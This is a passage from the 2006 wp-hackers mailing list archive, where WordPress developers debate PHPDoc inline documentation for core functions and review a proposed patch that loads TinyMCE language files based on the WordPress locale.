Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Thu Feb 16 18:21:22 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 18:23:15 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3CE5D.7080907@ebroder.net>
References: <43F33C8D.2010509@rcbowen.com>	<43F373EB.7000505@atl.lmco.com>	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>	<43F3805C.2060305@skippy.net>	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>	<43F3B573.7010005@ebroder.net>	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>	<ebe43d680602151526i78f3cec7m@mail.gmail.com>	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net>
Message-ID: <43F4C2A2.2050101@rcbowen.com>

Evan Broder wrote:
> Craig wrote:
>> Okay, so where does this leave us? Do we not need someone's "approval"
>> to do
>> something like this? Is there anyone around willing to lead the charge on
>> such an initiative? I'm certainly willing to assist, but it would have
>> to be
>> more of a make-the-comments-look-pretty-etc function as I am in no
>> position
>> to actually document something.
>>
>> Buhler? Buhler? Buhler?
>>   
> Another thought: it would make sense to use formatting that could be
> extracted with doxygen or whatever equivalent there is for PHP. That
> way, we could go create webpages with searchable documentation on all of
> the functions. I know that when I'm trying to trace a problem through
> the core, it's always a pain to find all of the various functions in the
> source.

Yes. PHPDoc was what I recommend, and mentioned in the initial post on
this thread.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Thu Feb 16 18:21:58 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 18:23:46 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F373EB.7000505@atl.lmco.com>	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>	<43F3805C.2060305@skippy.net>	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>	<43F3B573.7010005@ebroder.net>	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>	<ebe43d680602151526i78f3cec7m@mail.gmail.com>	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
Message-ID: <43F4C2C6.6090907@rcbowen.com>

Craig wrote:
> Okay, so where does this leave us? Do we not need someone's "approval" to do
> something like this? Is there anyone around willing to lead the charge on
> such an initiative? I'm certainly willing to assist, but it would have to be
> more of a make-the-comments-look-pretty-etc function as I am in no position
> to actually document something.

Well, I kinda volunteered by starting the thread, but it will require
assistance on functions that aren't easy to read.

-- 
Rich Bowen
rbowen@rcbowen.com
From blogger at steffensenfamily.com  Thu Feb 16 18:27:42 2006
From: blogger at steffensenfamily.com (Kirk Steffensen)
Date: Thu Feb 16 18:29:37 2006
Subject: [wp-hackers] Language support for TinyMCE
Message-ID: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>

WP Hackers,

Below is a proposed change to wp-includes/js/tinymce/tiny_mce_gzip.php to
restore native TinyMCE language support.  Before I post this to Trac as an
enhancement, I wanted to make sure that I'm not missing something.  If no one
points out a logic error or a better way to build the mousetrap, I'll make a
patch and post it to Trac.

===BACKGROUND===

I was happy to finally find documentation on the TinyMCE filters at
http://codex.wordpress.org/Plugin_API#Rich_Editor_Filters - I even added some
example functions to the codex once I worked them out for the WPG2 plugin.

However, I haven't been able to figure out a way to restore the native TinyMCE
language support.  It looks like tiny_mce_gzip.php will apply
wp_translate_tinymce_lang, which in turn applies the overall WordPress mo and
po files.  So, if there is a phrase that's in the master mo and po, you're good
to go.  But since the TinyMCE plugins are not WordPress plugins, there is no
obvious way to make and apply a mo and po file for them.

The only language files that ship with the WP instance of TinyMCE are the en.js
files.  The only phrases that I could find supported in the overall WP mo and
po files are in support of the TinyMCE WP help popup.  If you want to install
the other lang files from TinyMCE, e.g., de.js or zh_TW.js, it appears you're
out of luck.

===PROPOSED CHANGE===

I propose changing the following code in tiny_mce_gzip.php to allow loading
TinyMCE lang files, if they exist.  The code change finds WP's locale setting
(xx), and then checks to see if there are corresponding xx.js files for core
TinyMCE, the active TinyMCE theme, and any plugins.  If there are not
corresponding xx.js files, then the default en.js file is loaded.  After that,
the the wp_translate_tinymce_lang function is still called.

Existing Code:
[code]
	// Load theme, language pack and theme language packs
	$theme = apply_filters('mce_theme', 'advanced');

	echo wp_compact_tinymce_js(file_get_contents(realpath("themes/" . $theme .
"/editor_template.js")));

	echo wp_translate_tinymce_lang(file_get_contents(realpath("themes/" . $theme .
"/langs/en.js")));

	echo wp_translate_tinymce_lang(file_get_contents(realpath("langs/en.js")));

	// Load all plugins and their language packs
	$plugins = apply_filters('mce_plugins', array('wordpress', 'autosave',
'wphelp'));

	foreach ($plugins as $plugin) {
		$pluginFile = realpath("plugins/" . $plugin . "/editor_plugin.js");
		$languageFile = realpath("plugins/" . $plugin . "/langs/en.js");

[/code]

Proposed New Code:
[code]
	// Load theme, language pack and theme language packs
	$theme = apply_filters('mce_theme', 'advanced');

	echo wp_compact_tinymce_js(file_get_contents(realpath("themes/" . $theme .
"/editor_template.js")));

	// Get the WordPress locale
	$locale = get_locale();

	$themeLanguageFile = realpath("themes/" . $theme . "/langs/" . $locale .
".js");

	if (!file_exists($themeLanguageFile))
		$themeLanguageFile = realpath("themes/" . $theme . "/langs/en.js");
	echo wp_translate_tinymce_lang(file_get_contents($themeLanguageFile));

	$tinymceLanguageFile = realpath("langs/" . $locale . ".js");

	if (!file_exists($tinymceLanguageFile))
		$tinymceLanguageFile = realpath("langs/en.js");
	echo wp_translate_tinymce_lang(file_get_contents($tinymceLanguageFile));

	// Load all plugins and their language packs
	$plugins = apply_filters('mce_plugins', array('wordpress', 'autosave',
'wphelp'));

	foreach ($plugins as $plugin) {
		$pluginFile = realpath("plugins/" . $plugin . "/editor_plugin.js");
		$languageFile = realpath("plugins/" . $plugin . "/langs/" . $locale . ".js");
		if (!file_exists($languageFile))
			$languageFile = realpath("plugins/" . $plugin . "/langs/en.js");
[/code]

We've tested this quite a bit in the WPG2 community and it works well.  Stephen
Ju of http://www.ju-ju.com/ did most of the development on this and has
successfully implemented a zh_TW.js file for my TinyMCE plugin
(http://g2image.steffensenfamily.com) and has restored zh_TW.js for the both
core TinyMCE and the advanced theme.

If we're missing an easier way to do this, or someone else has already hacked a
better hack, please let us know.  If not, I'll put together a patch and submit
it to Trac.

Thanks,
Kirk

Kirk Steffensen
From steagl at people.it  Thu Feb 16 18:43:00 2006
From: steagl at people.it (Stefano)
Date: Thu Feb 16 18:45:01 2006
Subject: [wp-hackers] 2.next simpler - revolution
Message-ID: <1fh9v1lbrafkmbqbcepcfqcj097dirnk41@4ax.com>

I think this proposal won't be very popular, but.. :)

After quite 2 months i can say that on italian forum and on italians
blog the judgement for the RTE and File manager is not really high,
people complain about weakness, slowness, limeted functions etc about
this.

Some are going to use different editors and I personally tested
ChenPress Plugin (based on FCK 2.0 I think) and Imaga Managr plugin
(http://soderlind.no/ImageManager) and i can say that they looks
better and more usable particualry the secodn one that allow some pict
management and a better navigation system on uploads directory.

I personally still use classic editor and using the uploader really
few times it's not so bad even if interface should be surely improved.

I didn't read to much here about that part and maybe a discussion
should be necessary to write down future of RTE and Image Manager
improvements or, and this its a bit crazy and surely unpopular idea,
take another way no aiming o another editor and a better image
manager.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From lists at abhaykumar.net  Thu Feb 16 19:11:42 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Thu Feb 16 19:13:31 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F4C2C6.6090907@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com> <43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F4C2C6.6090907@rcbowen.com>
Message-ID: <512061b90602161111g64c61f8dqc393a8af252261d8@mail.gmail.com>

> Well, I kinda volunteered by starting the thread, but it will require
> assistance on functions that aren't easy to read.

I'm sure some one will be able to answer any questions that come up.
Or even simply, you can divvy up the entire source into chunks and
play coordinator so two people aren't working on one chunk.

Easiest workflow is:

X gets the chunk and documents the entire set, passes it over to Y who
checks for inconsistencies / missing parts and either fixes them or
marks for a fix. After X and Y have their dialogue, both sign off on
it and Z does a final glance over. Each chunk gets submitted into
trac, separately.

All that needs to be done is to standardize style and split up the
source into chunks. Don't forget to set reasonable turnaround times so
that it doesn't sit and stew for months.

- Abhay
--
Abhay Kumar
http://abhaykumar.net/
From rbowen at rcbowen.com  Thu Feb 16 20:38:07 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 20:40:05 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>	<43F3D307.6040009@midnightcircus.com>	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
Message-ID: <43F4E2AF.5080400@rcbowen.com>

Mark Jaquith wrote:
> We still need word from Matt or Ryan that this is the sort of thing that
> they'd put into WP.  I think it sounds worthwhile, and I'd certainly
> like to help, but I don't have commit access, so it's not my call
> whether or not it goes in.

That really was the whole of my initial question. Is this something
that, having spent my time on, would end up getting committed, or would
it be rejected. It's a significant time investment to undertake before
knowing what its eventual fate will be.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Thu Feb 16 20:40:23 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 20:42:10 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
Message-ID: <43F4E337.7090209@rcbowen.com>

David House wrote:
> On 16/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
>> We could work on patches amongst ourselves, and then when we think
>> they're ready to go we could have 2 or 3 people sign off on it and
>> send it off with a "commit" tag.
> 
> That's what bug gardeners are for, right? :)
> 
> I'll bg|commit any of these patches as long as the commenting isn't
> overboard. My personal commenting policy is one line before each
> function (plus other places within the function, but I think we are
> mainly deailing with the former type in this thread). If the
> parameters names aren't self explanatory, then perhaps a short
> sentence explaining their purpose, but nothing > 3 lines in total.

I fail to see any value to such a limit. The entire purpose of doing is
is so that there is inline API documentation. That requires, at a
miminum, a description of the argument(s) and the return value(s).
Forcing an arbitrary line number limit on that is artificial and
unnecessary.

-- 
Rich Bowen
rbowen@rcbowen.com
From ringmaster at midnightcircus.com  Thu Feb 16 20:53:22 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Feb 16 20:53:42 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F4E337.7090209@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com>
Message-ID: <43F4E642.3050300@midnightcircus.com>

Rich Bowen wrote:
> The entire purpose of doing is
> is so that there is inline API documentation. That requires, at a
> miminum, a description of the argument(s) and the return value(s).

While I'm thinking of parameters...

Is there a standard way to document querystring parameters in PHPDoc? 
There are a handful of functions in WP that use them.  They should all 
specify every option and the defaults used when the parameter is not 
included.

Did anyone start a Codex page yet on the formatting for this thing?

Owen


From nuclearmoose at gmail.com  Thu Feb 16 21:03:11 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb 16 21:05:08 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F4E642.3050300@midnightcircus.com>
References: <43F33C8D.2010509@rcbowen.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
Message-ID: <5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>

http://codex.wordpress.org/Inline_Documentation/

On 2/16/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
>
> Did anyone start a Codex page yet on the formatting for this thing?
>
> Owen
>
From rbowen at rcbowen.com  Thu Feb 16 21:03:43 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 21:05:37 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <E7340445E0595A418B2F8DE0AE480E2009AED150@ucmail6.ad.uc.edu>
References: <E7340445E0595A418B2F8DE0AE480E2009AED150@ucmail6.ad.uc.edu>
Message-ID: <43F4E8AF.1010900@rcbowen.com>

Vogel, Andrew (vogelap) wrote:
> How much overhead does inline comments add to the code? I cannot imagine
> it to be very much. I agree with Scott that the teaching aspects are
> important.

Benchmarks indicate that even large amounts of inline documentation
(like one line of comments per line of code, for example) have
negligible effect on execution time.

-- 
Rich Bowen
rbowen@rcbowen.com
From nuclearmoose at gmail.com  Thu Feb 16 21:03:54 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb 16 21:05:42 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
Message-ID: <5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>

Crap
http://codex.wordpress.org/Inline_Documentation

is the correct URL.

Craig.


On 2/16/06, Craig <nuclearmoose@gmail.com> wrote:
>
> http://codex.wordpress.org/Inline_Documentation/
>
> On 2/16/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> >
> >
> > Did anyone start a Codex page yet on the formatting for this thing?
> >
> > Owen
> >
>
>
From skeltoac at gmail.com  Thu Feb 16 21:25:47 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb 16 21:27:36 2006
Subject: [wp-hackers] Language support for TinyMCE
In-Reply-To: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
References: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
Message-ID: <e6ec604d0602161325p7d0f91c8j8e17fea15e068822@mail.gmail.com>

On 2/16/06, Kirk Steffensen <blogger@steffensenfamily.com> wrote:
> I propose changing the following code in tiny_mce_gzip.php to allow loading
> TinyMCE lang files, if they exist.  The code change finds WP's locale setting
> (xx), and then checks to see if there are corresponding xx.js files for core
> TinyMCE, the active TinyMCE theme, and any plugins.  If there are not
> corresponding xx.js files, then the default en.js file is loaded.  After that,
> the the wp_translate_tinymce_lang function is still called.

Looks great to me!

Andy
From false.hopes at gmail.com  Thu Feb 16 22:42:13 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Feb 16 22:44:03 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
Message-ID: <a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>

I'd recommend the following format. It is generated with the wonderful
completion in Zend Studio, will work properly with Zend Studio and
PHPDocumenter/phpxref.

/**
 * Enter description here...
 *
 * @param type $a_meaningful_var_name
 * @param type $a_meaningful_var_name
 * @return type description
 */

--
--Robert Deaton
http://somethingunpredictable.com
From rbowen at rcbowen.com  Thu Feb 16 22:47:41 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 22:49:30 2006
Subject: [wp-hackers] [PATCH] Documentation
Message-ID: <43F5010D.6070304@rcbowen.com>

Example documentation patch. Note, this is just one example, and not one
of the most useful ones - just one of the simplest ones. More complex
examples would also contain a simple explanation of the return value.


Index: functions.php
===================================================================
--- functions.php       (revision 3535)
+++ functions.php       (working copy)
@@ -47,6 +47,9 @@
        return $j;
 }

+/** current_time( $type = ('mysql'|'timestamp')
+*               [ , $gmt = (true|false) ] )
+*/
 function current_time($type, $gmt = 0) {
        switch ($type) {



-- 
Rich Bowen
rbowen@rcbowen.com
From skeltoac at gmail.com  Thu Feb 16 22:49:43 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb 16 22:51:32 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
Message-ID: <e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>

On 2/16/06, Robert Deaton <false.hopes@gmail.com> wrote:
> I'd recommend the following format. It is generated with the wonderful
> completion in Zend Studio, will work properly with Zend Studio and
> PHPDocumenter/phpxref.

Speaking selfishly (because I like Zend Studio) I would love to have
this style of comments on every function, no matter how small.

However, I know that most people won't be so grateful to have a
minimum of seven lines padding every function in the core. So I won't
advocate that format even though I like it personally.

Andy
From false.hopes at gmail.com  Thu Feb 16 22:53:30 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Feb 16 22:55:17 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
Message-ID: <a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>

On 2/16/06, Andy Skelton <skeltoac@gmail.com> wrote:
> Speaking selfishly (because I like Zend Studio) I would love to have
> this style of comments on every function, no matter how small.

+1
Perhaps this is proof that its time we need to clean up some of the
functions and remove some silly redundant or simply too small ones, we
have over 1,000 something functions.

> However, I know that most people won't be so grateful to have a
> minimum of seven lines padding every function in the core. So I won't
> advocate that format even though I like it personally.

Not necessarily seven, template tags need but three
/**
 * Outputs the title of a post, sanitized of course
 **/

--
--Robert Deaton
http://somethingunpredictable.com
From lists at abhaykumar.net  Thu Feb 16 22:54:38 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Thu Feb 16 22:56:26 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
Message-ID: <512061b90602161454u363ddd41n93a2b528c44d9803@mail.gmail.com>

> Speaking selfishly (because I like Zend Studio) I would love to have
> this style of comments on every function, no matter how small.

Andy, that's exactly what is being proposed here :)

> However, I know that most people won't be so grateful to have a
> minimum of seven lines padding every function in the core. So I won't
> advocate that format even though I like it personally.

As was discussed, the actual amount of additional overhead for the php
interpreter is minimal. The only major 'problem' may be that the
footprint of wordpress is now larger.

- Abhay
--
Abhay Kumar
http://abhaykumar.net/
From nuclearmoose at gmail.com  Thu Feb 16 22:54:43 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb 16 22:56:30 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
Message-ID: <5aa3aa0602161454j4f73c26ey1c95979fa72c523e@mail.gmail.com>

We can move all of this to Codex now, (although there is a Error 500 at the
moment) to http://codex.wordpress.org/Inline_Documentation
Craig.


On 2/16/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
> I'd recommend the following format. It is generated with the wonderful
> completion in Zend Studio, will work properly with Zend Studio and
> PHPDocumenter/phpxref.
>
> /**
> * Enter description here...
> *
> * @param type $a_meaningful_var_name
> * @param type $a_meaningful_var_name
> * @return type description
> */
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From skeltoac at gmail.com  Thu Feb 16 22:55:16 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb 16 22:57:07 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <43F5010D.6070304@rcbowen.com>
References: <43F5010D.6070304@rcbowen.com>
Message-ID: <e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>

On 2/16/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> +/** current_time( $type = ('mysql'|'timestamp')
> +*               [ , $gmt = (true|false) ] )
> +*/

If this is meant to help people read the code, I think it's too cryptic.

Receipt:
one opinion, two cents.
delivery, no charge.

Andy
From false.hopes at gmail.com  Thu Feb 16 22:58:16 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Feb 16 23:00:09 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
Message-ID: <a491f91d0602161458t4f024c5cw1d6e76d69913b248@mail.gmail.com>

From IRC:

<photomatt> as to whether specific patches would be accepted, it's
hard to say without seeing them
<photomatt> if the patch was like the one DrB had above which had 6
lines about a 7 line function, then probably not
<davidhouse> photomatt: right. so ignore the small functions?
<photomatt> davidhouse, yes, small functions would probably be a good
candidate to not wory about

Or skeltoac's nice summary:

"Pre-approval is not going to be granted for any proposed patches that
aren't written. If you want docs in the core, make them smart and
light (like WordPress itself) and upload them to trac."

So, I hope to anyone interested that this doesn't hamper your efforts.
Personally I hope that even the small functions will be documented,
even if I have to do them myself, and even if they aren't committed.

--
--Robert Deaton
http://somethingunpredictable.com
From skeltoac at gmail.com  Thu Feb 16 23:03:31 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb 16 23:05:21 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a491f91d0602161458t4f024c5cw1d6e76d69913b248@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<ebe43d680602160627w1d5ac4f1l@mail.gmail.com>
	<43F4E337.7090209@rcbowen.com> <43F4E642.3050300@midnightcircus.com>
	<5aa3aa0602161303kde7be7bw5cfe18d9d831ca16@mail.gmail.com>
	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>
	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>
	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
